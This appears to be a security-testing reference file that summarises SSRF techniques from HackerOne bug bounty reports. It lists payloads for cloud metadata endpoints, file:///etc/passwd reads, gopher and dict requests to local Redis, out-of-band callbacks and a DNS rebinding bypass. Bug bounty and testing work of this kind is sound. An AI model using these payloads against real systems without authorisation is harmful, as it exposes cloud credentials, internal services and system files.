---
name: "h1-ssrf-techniques"
description: "Server-Side Request Forgery patterns from HackerOne reports — STUN SSRF ($3500), DNS rebinding ($3500), photo upload SSRF+LFI ($6000), metadata endpoint exploitation"
category: web-security
tags: ["ssrf", "server-side-request", "dns-rebinding", "cloud-metadata", "hackerone"]
relevance: 10
---

# H1 SSRF Testing Techniques

Real-world SSRF vulnerabilities with $150-$6000 bounties:

## 1. Protocol-Based SSRF
Report: Slack STUN SSRF ($3500)
- Test: STUN/TURN protocol handlers
- Payload: `stun:internal-server:3478`
- Look for: Responses from internal services

## 2. Photo/File Upload SSRF
Report: Mail.ru SSRF + Local File Read via photo upload ($6000)
- Test: Image URL processing endpoints
- Payload: `http://169.254.169.254/latest/meta-data/`
- Payload: `file:///etc/passwd`
- Endpoints: photo upload, avatar upload, file processing

## 3. DNS Rebinding SSRF
Report: GitLab SSRF bypass through DNS Rebinding in WebHooks ($3500)
- Test: WebHook URLs with custom domains that change DNS
- Payload: Domain that resolves to public IP first, then internal IP
- Bypass: Use DNS TTL=0 and switch resolution after validation

## 4. Cloud Metadata SSRF
Target URLs for cloud metadata:
```
AWS: http://169.254.169.254/latest/meta-data/
GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2017-08-01
Alibaba: http://100.100.100.200/latest/meta-data/
DigitalOcean: http://169.254.169.254/metadata/v1.json
```

## 5. Blind SSRF Detection
Report: Mail.ru Blind SSRF ($150)
- Use: Collaborator/interact.sh or Burp Collaborator
- Payload: `http://your-collaborator-domain/oob`
- Watch for: DNS/HTTP callbacks from target server

## 6. SSRF → LFI Chain
Report: SEMrush SSRF + LFI in Site Audit ($2000)
- Test: URL/file parameter in PDF generators, site audit tools
- Payload: `file:///etc/passwd`
- Payload: `dict://localhost:6379/info` (Redis)
- Payload: `gopher://localhost:6379/_*2%0d%0a...`
